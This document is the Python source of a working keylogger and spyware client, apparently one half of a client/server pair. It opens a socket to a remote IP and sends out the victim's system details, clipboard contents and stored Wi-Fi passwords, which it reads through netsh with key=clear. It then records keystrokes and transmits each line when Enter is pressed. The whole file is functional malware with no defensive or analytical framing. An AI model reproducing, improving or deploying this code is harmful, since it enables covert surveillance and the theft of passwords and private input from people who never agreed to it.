import socket
import sys
import platform
import pyperclip
import subprocess
import re
from pynput import keyboard
from requests import get

def getComputerInfo():
    info = ''
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    try:
        public_ip = get("https://api.ipify.org").text
        info += ("Public IP Address: " + public_ip + "\n")

    except Exception:
        info +=("Couldn't get Public IP Address (most likely max query)" + "\n")

    info +=("Processor: " + (platform.processor()) + '\n')
    info +=("System: " + platform.system() + " " + platform.version() + '\n')
    info +=("Machine: " + platform.machine() + "\n")
    info +=("Hostname: " + hostname + "\n")
    info +=("Private IP Address: " + IPAddr + "\n")
    return(info)

def getClipboardInfo():
    try:
        clipboard_text = pyperclip.paste()
        return("Clipboard : " + clipboard_text + '\n')
    except:
        return('Clipboard could not be copied' + '\n')


def getWifiInfo():
    try:
        command = "netsh wlan show profile"

        networks = subprocess.check_output(command, shell=True).decode('cp1252')
        network_names_list = re.findall("(?<=: )[^\n]+", networks)
        network_names_list = [i.strip() for i in network_names_list]

        result = ""
        for network_name in network_names_list:
            try:
                command = "netsh wlan show profile " + network_name + " key=clear"
                current_result = subprocess.check_output(command, shell=True).decode('cp1252')
                key_content = re.findall("(?<=Contenu de la cl‚            : )[^\n]+", current_result)
                result += (key_content[0] + '\n')
            except:
                continue
    except:
        return("Cannot access wifi info on this computer" + '\n')
    return(result)

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

IP = ""  #Enter the same IP adress here and in the client.py file 
PORT = 5050  
print('Initializing connection with server')
soc.connect((IP, PORT))  

logString = '\n'
firstTime = False
def on_press(key):  
    global logString, firstTime
    if not firstTime:
        soc.send(getComputerInfo().encode('utf-8'))
        soc.send(getClipboardInfo().encode('utf-8'))
        soc.send(getWifiInfo().encode('utf-8'))
        firstTime = True
    else:
        print("Key pressed:", key)
        if key != keyboard.Key.enter:
            if (str(key)).__contains__("Key."):
                if key == keyboard.Key.space:
                    logString += " "
                else:
                    if len(logString) > 1:
                        logString += "\n"
                        logString += str(key).strip("'")
                    else:
                        logString += str(key).strip("'")
                        logString += "\n"

            else: 
                logString += str(key).strip("'")
        else:
            soc.sendall((logString).encode('utf-8'))
            logString = "\n"

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

